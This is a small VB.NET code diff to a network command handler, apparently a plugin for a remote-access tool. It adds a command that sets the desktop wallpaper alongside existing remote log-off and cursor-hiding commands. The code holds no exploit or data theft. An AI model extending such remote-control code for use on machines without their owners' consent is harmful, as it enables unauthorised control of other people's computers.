@@ -3,9 +3,11 @@ Imports PacketLib
 Imports PacketLib.Packet
 Public Class Main
     Public Shared Async Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
+
         Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)
 
         Select Case CastParam
+
             Case Packet_Subject.LOG_OUT
 
                 Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_LOGOFF, 0))
@@ -63,6 +65,10 @@ Public Class Main
             Case Packet_Subject.CURSOR_VISIBILITY
 
                 Await Task.Run(Sub() NativeAPI.CursorVisibility(Param_Tab(1)))
+
+            Case Packet_Subject.SET_WPP
+
+                Await Task.Run(Sub() NativeAPI.SetWallpapertoBackground(Param_Tab(1), Param_Tab(2)))
         End Select
     End Sub
 
